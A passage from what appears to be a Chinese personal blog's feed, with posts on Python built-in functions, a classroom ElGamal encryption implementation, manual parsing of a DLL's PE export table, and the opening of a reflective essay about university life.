class="hljs-string">&quot;Record name is:&quot;</span>, R1.name) <span class="hljs-comment"># Record name is: My Record</span><br></code></pre></td></tr></table></figure><p>不过创建之后无法改变它们的值了，因为是元组。</p><h1 id="属性判断"><a href="#属性判断" class="headerlink" title="属性判断"></a>属性判断</h1><p>不要在 if 中使用 type 函数判断属性，而应该选择 isinstance()函数，例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">&gt;&gt; isinstance(<span class="hljs-string">&#x27;11&#x27;</span>,str)<br><span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure><h1 id="map-作用于-list-每一个元素"><a href="#map-作用于-list-每一个元素" class="headerlink" title="map-作用于 list 每一个元素"></a>map-作用于 list 每一个元素</h1><blockquote><p>参考：<a href="https://yangfangs.github.io/2017/08/23/python-map-zip-filter-reduce/">https://yangfangs.github.io/2017/08/23/python-map-zip-filter-reduce/</a></p></blockquote><p>map()是 Python 内置的高阶函数，它接收一个函数 f() 和一个 list，并通过把函数 f 依次作用在 list 的每个元素上，得到一个新的 list 并返回。</p><ol><li>例如 chr 类型转换成 int</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">l = [<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>]<br>list(map(int,l))<br>Out[<span class="hljs-number">2</span>]: [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>]<br></code></pre></td></tr></table></figure><ol start="2"><li>编写独立函数作用与 list 中每一个元素：<ul><li>例如对 list 中每一个元素求平方</li></ul></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f</span>(<span class="hljs-params">x</span>):</span><br>    <span class="hljs-keyword">return</span> x**<span class="hljs-number">2</span><br>l =[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>]<br>list(map(f,l))<br>Out[<span class="hljs-number">3</span>]: [<span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">9</span>, <span class="hljs-number">16</span>]<br></code></pre></td></tr></table></figure><ol start="3"><li>使用匿名函数操作：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">l =[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>]<br>list(map(<span class="hljs-keyword">lambda</span> x: x**<span class="hljs-number">2</span>, l))<br>Out[<span class="hljs-number">4</span>]: [<span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">9</span>, <span class="hljs-number">16</span>]<br></code></pre></td></tr></table></figure><h2 id="同时操作两个-list-并行非多核运算"><a href="#同时操作两个-list-并行非多核运算" class="headerlink" title="同时操作两个 list(并行非多核运算)"></a>同时操作两个 list(并行非多核运算)</h2><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">l =[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>]<br>list(map(lambda x,y: x+y,l,l))<br>Out[<span class="hljs-number">5</span>]: [<span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">8</span>]<br></code></pre></td></tr></table></figure><blockquote><p>注：python3 和 python2 中 map()的返回值不一样， python2 中直接返回列表，python 需要加 list()转换取值。</p></blockquote><h1 id="filter-筛选函数"><a href="#filter-筛选函数" class="headerlink" title="filter-筛选函数"></a>filter-筛选函数</h1><p>按照 function 函数的规则在列表 sequence 中筛选数据</p><ul><li>用法：filter(function, sequence)</li></ul><h2 id="筛选-list-中符合条件的值"><a href="#筛选-list-中符合条件的值" class="headerlink" title="筛选 list 中符合条件的值"></a>筛选 list 中符合条件的值</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">l =[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>]<br>filter(<span class="hljs-keyword">lambda</span> x: x&gt;<span class="hljs-number">2</span>, l)<br>Out[<span class="hljs-number">6</span>]: [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>]<br></code></pre></td></tr></table></figure><h2 id="filter-与-map-返回值不同"><a href="#filter-与-map-返回值不同" class="headerlink" title="filter() 与 map() 返回值不同"></a>filter() 与 map() 返回值不同</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">l =[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>]<br>map(<span class="hljs-keyword">lambda</span> x: x&gt;<span class="hljs-number">2</span>, l)<br>Out[<span class="hljs-number">8</span>]: [<span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>, <span class="hljs-literal">True</span>, <span class="hljs-literal">True</span>]<br></code></pre></td></tr></table></figure><h1 id="reduce-——求积累运算"><a href="#reduce-——求积累运算" class="headerlink" title="reduce()——求积累运算"></a>reduce()——求积累运算</h1><p>reduce 函数功能是将 sequence 中数据，按照 function 函数操作，如将列表第一个数与第二个数进行 function 操作，得到的结果和列表中下一个数据进行 function 操作，一直循环下去…</p><ul><li>用法 reduce(function, sequence):</li></ul><h2 id="求积累和"><a href="#求积累和" class="headerlink" title="求积累和"></a>求积累和</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">l =[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>]<br>reduce(<span class="hljs-keyword">lambda</span> x,y: x+y, l)<br>Out[<span class="hljs-number">10</span>]: <span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><h1 id="zip-打包函数"><a href="#zip-打包函数" class="headerlink" title="zip()打包函数"></a>zip()打包函数</h1><ul><li><p>zip()是 Python 的一个内建函数，它接受一系列可迭代的对象作为参数，将对象中对应的元素打包成一个个 tuple（元组），然后返回由这些 tuples 组成的 list（列表）。若传入参数的长度不等，则返回 list 的长度和参数中长度最短的对象相同。利用*号操作符，可以将 list unzip（解压）。</p></li><li><p>用法: zip(list,list)</p></li></ul><h2 id="zip-基本用法"><a href="#zip-基本用法" class="headerlink" title="zip()基本用法"></a>zip()基本用法</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">l1 = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>]<br>l2 = [<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>]<br>zip(l1,l2)<br>Out[<span class="hljs-number">12</span>]: [(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;a&#x27;</span>), (<span class="hljs-number">2</span>, <span class="hljs-string">&#x27;b&#x27;</span>), (<span class="hljs-number">3</span>, <span class="hljs-string">&#x27;c&#x27;</span>), (<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;d&#x27;</span>)]<br></code></pre></td></tr></table></figure><h2 id="使用-逆过程"><a href="#使用-逆过程" class="headerlink" title="使用*逆过程"></a>使用<code>*</code>逆过程</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">l1 = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>]<br>l2 = [<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>]<br>zip_l1_l2 = zip(l1,l2)<br>zip(*zip_l1_l2)<br>Out[<span class="hljs-number">17</span>]: [(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>), (<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>)]<br></code></pre></td></tr></table></figure><h2 id="zip-构造字典"><a href="#zip-构造字典" class="headerlink" title="zip 构造字典"></a>zip 构造字典</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">l1 = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>]<br>l2 = [<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>]<br>zip_l1_l2 = zip(l1,l2)<br>dict(zip_l1_l2)<br>Out[<span class="hljs-number">18</span>]: &#123;<span class="hljs-number">1</span>: <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-number">2</span>: <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-number">3</span>: <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-number">4</span>: <span class="hljs-string">&#x27;d&#x27;</span>&#125;<br></code></pre></td></tr></table></figure><p>这个操作就可以更加优雅的创造数据结构。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python">In [<span class="hljs-number">63</span>]: a = collections.namedtuple(<span class="hljs-string">&#x27;stu&#x27;</span>,[<span class="hljs-string">&#x27;id&#x27;</span>,<span class="hljs-string">&#x27;name&#x27;</span>,<span class="hljs-string">&#x27;sex&#x27;</span>])<br><br>In [<span class="hljs-number">64</span>]: a<br>Out[<span class="hljs-number">64</span>]: __main__.stu<br><br>In [<span class="hljs-number">65</span>]: s1 = a(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;11&#x27;</span>,<span class="hljs-string">&#x27;f&#x27;</span>)<br><br>In [<span class="hljs-number">66</span>]: s1<br>Out[<span class="hljs-number">66</span>]: stu(id=<span class="hljs-number">1</span>, name=<span class="hljs-string">&#x27;11&#x27;</span>, sex=<span class="hljs-string">&#x27;f&#x27;</span>)<br><br>In [<span class="hljs-number">67</span>]: l1<br>Out[<span class="hljs-number">67</span>]: [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>]<br><br>In [<span class="hljs-number">68</span>]: l2 = [s1,s1,s1,s1]<br><br>In [<span class="hljs-number">69</span>]: ll = zip(l1,l2)<br><br>In [<span class="hljs-number">70</span>]: f = dict(ll)<br><br>In [<span class="hljs-number">71</span>]: f<br>Out[<span class="hljs-number">71</span>]:<br>&#123;<span class="hljs-number">1</span>: stu(id=<span class="hljs-number">1</span>, name=<span class="hljs-string">&#x27;11&#x27;</span>, sex=<span class="hljs-string">&#x27;f&#x27;</span>),<br> <span class="hljs-number">2</span>: stu(id=<span class="hljs-number">1</span>, name=<span class="hljs-string">&#x27;11&#x27;</span>, sex=<span class="hljs-string">&#x27;f&#x27;</span>),<br> <span class="hljs-number">3</span>: stu(id=<span class="hljs-number">1</span>, name=<span class="hljs-string">&#x27;11&#x27;</span>, sex=<span class="hljs-string">&#x27;f&#x27;</span>),<br> <span class="hljs-number">4</span>: stu(id=<span class="hljs-number">1</span>, name=<span class="hljs-string">&#x27;11&#x27;</span>, sex=<span class="hljs-string">&#x27;f&#x27;</span>)&#125;<br><br>In [<span class="hljs-number">72</span>]: f[<span class="hljs-number">1</span>]<br>Out[<span class="hljs-number">72</span>]: stu(id=<span class="hljs-number">1</span>, name=<span class="hljs-string">&#x27;11&#x27;</span>, sex=<span class="hljs-string">&#x27;f&#x27;</span>)<br><br>In [<span class="hljs-number">73</span>]: f[<span class="hljs-number">1</span>].id<br>Out[<span class="hljs-number">73</span>]: <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SecCrpytoExp-2</title>
    <link href="/2020/11/06/SecCrpytoExp-2_new/"/>
    <url>/2020/11/06/SecCrpytoExp-2_new/</url>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="Elgamal-密码"><a href="#Elgamal-密码" class="headerlink" title="Elgamal 密码"></a>Elgamal 密码</h1><p>首先用到了几个强大的库（避免重复造轮子）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sympy<br><span class="hljs-keyword">from</span> Crypto.Util <span class="hljs-keyword">import</span> number<br></code></pre></td></tr></table></figure><p><code>sympy</code>用于计算原根，它是一个强大的符号计算的 python 库。不仅可以像 mathematica 一样进行符号计算，也内置了很多的 OI 实用算法，包括图论、计算几何、数论、多项式等等很多方面。</p><blockquote><p>更多用法可以看这里 <a href="https://2o181o28.github.io/2019/07/14/sympy%E7%9A%84OI%E7%94%A8%E6%B3%95/">https://2o181o28.github.io/2019/07/14/sympy%E7%9A%84OI%E7%94%A8%E6%B3%95/</a></p></blockquote><p><code>Crypto</code>则是更加强大的密码学库<br>然后就是 exp 了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Author: M@tr1x</span><br><span class="hljs-string">Date: 2020-11-06 17:15:32</span><br><span class="hljs-string">LastEditTime: 2020-11-08 12:14:15</span><br><span class="hljs-string">Description: Elgamal密码加解密程序</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util <span class="hljs-keyword">import</span> number<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> sympy<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Elgamal</span>():</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self,p_length</span>):</span><br>        self.p = number.getPrime(p_length)<span class="hljs-comment">#a random prime number with 2 ^ p_length</span><br>        self.x = random.randint(<span class="hljs-number">2</span>,self.p<span class="hljs-number">-3</span>)<span class="hljs-comment">#private key</span><br>        self.g = sympy.primitive_root(self.p)<span class="hljs-comment">#the smallest primitive root</span><br>        self.y = int(gmpy2.powmod(self.g,self.x,self.p))<span class="hljs-comment">#public key y</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encrypt</span>(<span class="hljs-params">self,m</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;crypto function</span><br><span class="hljs-string"></span><br><span class="hljs-string">        Args:</span><br><span class="hljs-string">            m (num): plain decimal message</span><br><span class="hljs-string"></span><br><span class="hljs-string">        Returns:</span><br><span class="hljs-string">            y1,y2: encrypted k&amp;m</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        k = random.randint(<span class="hljs-number">1</span>,self.p<span class="hljs-number">-2</span>)<br>        <span class="hljs-keyword">while</span> int(gmpy2.gcd(k,self.p<span class="hljs-number">-1</span>))!=<span class="hljs-number">1</span>:<br>            k = random.randint(<span class="hljs-number">1</span>,self.p<span class="hljs-number">-2</span>)<br>        y1 = gmpy2.powmod(self.g,k,self.p)<br>        y2  = (m%self.p)*int(gmpy2.powmod(self.y,k,self.p))%self.p<br>        y1 = int(y1)<br><br>        <span class="hljs-keyword">return</span> y1,y2<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decrypt</span>(<span class="hljs-params">self,y1,y2</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;decrypto function</span><br><span class="hljs-string"></span><br><span class="hljs-string">        Args:</span><br><span class="hljs-string">            y1 (num):</span><br><span class="hljs-string">            y2 (num):</span><br><span class="hljs-string"></span><br><span class="hljs-string">        Returns:</span><br><span class="hljs-string">            m: plain message</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        yi = int(gmpy2.invert(y1,self.p))<br>        m = int(gmpy2.powmod(yi,self.x,self.p))*(y2%self.p)%self.p<br>        <span class="hljs-keyword">return</span> m<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    new_elgamal = Elgamal(<span class="hljs-number">50</span>)<br>    (y1,y2) = new_elgamal.encrypt(<span class="hljs-number">9999999</span>)<span class="hljs-comment">#encrypt 9999999</span><br>    print(<span class="hljs-string">&quot;y1:&quot;</span>+str(y1))<br>    print(<span class="hljs-string">&quot;y2:&quot;</span>+str(y2))<br>    m = new_elgamal.decrypt(y1,y2)<span class="hljs-comment">#decrypt y1&amp;y2</span><br>    print(<span class="hljs-string">&quot;m:&quot;</span>+str(m))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>crypto</category>
      
    </categories>
    
    
    <tags>
      
      <tag>crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RE-Dll-export-table</title>
    <link href="/2020/10/23/RE-Dll-export-table_new/"/>
    <url>/2020/10/23/RE-Dll-export-table_new/</url>
    
    <content type="html"><![CDATA[<a id="more"></a><p>#</p><p>首先查看 EXPORT Table 的 RVA 是 0x00092250<br><img src="https://image.hackerjerry.top/RE-Dll-export-table-1.png#align=left&display=inline&height=258&margin=%5Bobject%20Object%5D&name=image.png&originHeight=516&originWidth=1086&size=203973&status=done&style=none&width=543" alt="image.png"><br>通过 winhex 验证<br><img src="https://image.hackerjerry.top/RE-Dll-export-table-2.png#align=left&display=inline&height=42&margin=%5Bobject%20Object%5D&name=image.png&originHeight=84&originWidth=671&size=9325&status=done&style=none&width=335.5" alt="image.png">正确<br>由于 0x92250 在 rdata 节中，所以<br><img src="https://image.hackerjerry.top/RE-Dll-export-table-3.png#align=left&display=inline&height=184&margin=%5Bobject%20Object%5D&name=image.png&originHeight=368&originWidth=1225&size=149582&status=done&style=none&width=612.5" alt="image.png"><br>首个 IMAGE_EXPORT_DESCRIPTOR 结构的 RAW=0x92250-0x80000+0x65000=0x77250<br>通过 winhex 跳转到这里<br><img src="https://image.hackerjerry.top/RE-Dll-export-table-4.png#align=left&display=inline&height=244&margin=%5Bobject%20Object%5D&name=image.png&originHeight=332&originWidth=675&size=42132&status=done&style=none&width=497" alt="image.png"><br><strong>1.Name 成员解析</strong><br>  首先解析导出表重要的成员<br>Nmae: 在导出表一行位置处. 存储 0x096116，这是一个 RVA，所以我们要进行 RAW 转换.<br>0x96116-0x80000+0x65000=0x7b116<br><img src="https://image.hackerjerry.top/RE-Dll-export-table-5.png#align=left&display=inline&height=64&margin=%5Bobject%20Object%5D&name=image.png&originHeight=101&originWidth=689&size=15169&status=done&style=none&width=435" alt="image.png">跳转过来，可见这个成员保存的就是自己 DLL 的名称.<br><strong>2.Base 成员解析.   导出函数起始序号</strong><br>  导出函数的序号起始位置. 你 DLL 导出的函数.如果给序号了.那么就从这个序号开始. <br><strong>3.NumberOfFunctions  以及  NumberOfNmaes   函数导出总个数.以及函数以名字导出的个数</strong><br>这个两个成员很简单. 一个就是所有函数导出的个数.一个就是以名字进行导出的个数.  DLL 是可以以序号导出的.<br><img src="https://image.hackerjerry.top/RE-Dll-export-table-6.png#align=left&display=inline&height=70&margin=%5Bobject%20Object%5D&name=image.png&originHeight=96&originWidth=655&size=12020&status=done&style=none&width=476" alt="image.png">可以看出来都为 643 个<br><strong>4.函数地址表</strong><br><img src="https://image.hackerjerry.top/RE-Dll-export-table-7.png#align=left&display=inline&height=95&margin=%5Bobject%20Object%5D&name=image.png&originHeight=123&originWidth=658&size=16557&status=done&style=none&width=509" alt="image.png"><br>这里同样存的都是 RVA,需要经过计算得到 RAW<br>函数地址表 RAW == 0x77278<br>函数名称表 RAW == 0x78b84<br>函数序号表 RAW == 0x7a490<br>根据 ppt 知道，函数地址表指向一个偏移. 这个偏移存放了函数所有导出个数的函数的地址.<br><img src="https://image.hackerjerry.top/RE-Dll-export-table-8.png#align=left&display=inline&height=394&margin=%5Bobject%20Object%5D&name=image.png&originHeight=788&originWidth=1459&size=295853&status=done&style=none&width=729.5" alt="image.png"><br>例如所有导出函数有 2 个. 那么函数地址表中就有 2 项. 每一个占 4 个字节. 存放的是函数入口地址 RVA.<br>例如第一项 RVA 偏移为 0x0162A0 + ImageBase 就是函数地址.<br><img src="https://image.hackerjerry.top/RE-Dll-export-table-9.png#align=left&display=inline&height=89&margin=%5Bobject%20Object%5D&name=image.png&originHeight=178&originWidth=1062&size=76968&status=done&style=none&width=531" alt="image.png"><br>然后查看 getcurrentThreadId<br><img src="https://image.hackerjerry.top/RE-Dll-export-table-10.png#align=left&display=inline&height=146&margin=%5Bobject%20Object%5D&name=image.png&originHeight=291&originWidth=1105&size=201152&status=done&style=none&width=552.5" alt="image.png"><br>它是第 21f 个函数，计算偏移后的地址为 542*4+0x77278=0x77af0<br>winhex 跳过去看<br><img src="https://image.hackerjerry.top/RE-Dll-export-table-11.png#align=left&display=inline&height=91&margin=%5Bobject%20Object%5D&name=image.png&originHeight=106&originWidth=667&size=13804&status=done&style=none&width=572" alt="image.png"><br><strong>里面存放着函数的 RVA 偏移为 0x011a60，和 peview 中一致</strong><br><strong>若计算具体的函数地址，则为 0x011a60+0x6b800000=0x6b811a60</strong><br>通过 IDA 进行查看，同样验证结果<br><img src="https://image.hackerjerry.top/RE-Dll-export-table-12.png#align=left&display=inline&height=112&margin=%5Bobject%20Object%5D&name=image.png&originHeight=145&originWidth=801&size=21432&status=done&style=none&width=617" alt="image.png"><br>动态加载<br>右键<br><img src="https://image.hackerjerry.top/RE-Dll-export-table-13.png#align=left&display=inline&height=353&margin=%5Bobject%20Object%5D&name=image.png&originHeight=706&originWidth=1043&size=121278&status=done&style=none&width=521.5" alt="image.png"><br><img src="https://image.hackerjerry.top/RE-Dll-export-table-14.png#align=left&display=inline&height=82&margin=%5Bobject%20Object%5D&name=image.png&originHeight=111&originWidth=686&size=24178&status=done&style=none&width=507" alt="image.png"><br><img src="https://image.hackerjerry.top/RE-Dll-export-table-15.png#align=left&display=inline&height=148&margin=%5Bobject%20Object%5D&name=image.png&originHeight=296&originWidth=855&size=45777&status=done&style=none&width=427.5" alt="image.png"></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://www.cnblogs.com/gd-luojialin/p/11306189.html">PE 知识复习之 PE 的导出表</a></li><li>【逆向】PE 结构分析和关于 PE 的一些问题及解决 <a href="https://www.shangmayuan.com/a/3289bd534203495c996382ae.html#%E5%AF%BC%E5%87%BA%E8%A1%A8">https://www.shangmayuan.com/a/3289bd534203495c996382ae.html</a></li><li>EAT 表 <a href="https://www.shuzhiduo.com/A/x9J2YK1gz6/">https://www.shuzhiduo.com/A/x9J2YK1gz6/</a></li><li>【逆向】【PE 入门】使用 PEView 分析 PE 文件 <a href="https://blog.csdn.net/qq_43633973/article/details/102378477">https://blog.csdn.net/qq_43633973/article/details/102378477</a></li><li>《逆向学习日记》 No.1 手动计算 RvaToRaw 来查看函数导入表与导出表 <a href="https://www.dazhuanlan.com/2020/01/02/5e0dc9725d3e9/">https://www.dazhuanlan.com/2020/01/02/5e0dc9725d3e9/</a></li><li>基址重定位表 <a href="https://blog.csdn.net/SKI_12/article/details/80636568">https://blog.csdn.net/SKI_12/article/details/80636568</a> <a href="https://zhuanlan.kanxue.com/article-10619.htm">https://zhuanlan.kanxue.com/article-10619.htm</a></li><li>PE 结构体中导出表/导入表解析——初阶 - 看雪学院的文章 - 知乎 <a href="https://zhuanlan.zhihu.com/p/33348352">https://zhuanlan.zhihu.com/p/33348352</a></li></ul><h1 id="用到的工具"><a href="#用到的工具" class="headerlink" title="用到的工具"></a>用到的工具</h1><ul><li>pe_tree <a href="https://github.com/blackberry/pe_tree">https://github.com/blackberry/pe_tree</a></li><li>winhex</li><li>peview</li><li>IDA PRO</li></ul>]]></content>
    
    
    <categories>
      
      <category>RE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>RE</tag>
      
      <tag>PEview</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Write-in-autumn</title>
    <link href="/2020/10/17/Write-in-autumn_new/"/>
    <url>/2020/10/17/Write-in-autumn_new/</url>
    
    <content type="html"><![CDATA[<p>写在西安的第三个秋天。</p><a id="more"></a><h1 id="大三，大三"><a href="#大三，大三" class="headerlink" title="大三，大三"></a>大三，大三</h1><p>转眼，大学生活就过去了一半，我已经是大三的学生了。回想起当初的懵懂无知，如今的我，对学业，对为人处世，对面对挫折，对坚持梦想，又有了新的感悟与理解。</p><p>我没有想过，大学，竟然比高中更累。或许是高中有同行者一同奋斗，我望着他们，不觉得苦罢。</p><p>上了大学，异地恋无疾而终，我在诺大的校园孤身一人。我可能也有朋友，但仅仅是朋友，没有交到可以交心的朋友，悲哀么。可能我习惯了一人，习惯了一个人吃饭，一个人去图书馆，一个人去自习，一个人去跑步。一个人真的很自由，但一个人真的很孤单。</p><p>上了大学，我见识到了很厉害的人，他们的均分很高，他们的竞赛很强。在大学，高的均分意味着你保研的时候能报更好的大学，像我这样天资一般，智商平平的人，只有付出更多的努力才能尽量与他们缩小差距，但你能想象吗，比你优秀的人比你更努力。我们专业第一的羽神，就是这样一个女生。我在我们宿舍应该是最努力的一个人，也仅仅是一天最多学习 2.5+3+4.5 个小时，但她可以做到全天都呆在自习室，真的佩服。</p><p>上了大学，我接触了许多新鲜事物，我参加了不少的竞赛，虽然很多竞赛都没有拿多好的成绩，但在过程中，我认为自己是有所收获的。我认识了很多好老师，他们给予了我很多的帮助，特别是我的科研导师，在我还是小白的时候，带着我们打比赛，写专利，真的非常非常幸运遇到这样的好老师。上了大学，我结识了五湖四海的人，他们性格迥异，爱好不同，虽然只是泛泛之交，但依旧能给生活增添光彩。</p><p>上了大学，竞争更加大了。我第一次听到”卷“这个名词，大概是在大二的时候，那时候我并不理解，但上了大三我才真正体会。评奖学金的时候，信安普通专业前四居然在全院也能排到前四，而且分差并不大。而在其中，我的基础均分是最弱的。其实我不想卷，我不想把大学生活过的比高三还苦，但是我有什么办法。我曾经以为的那么难的课程，羽神轻轻松松 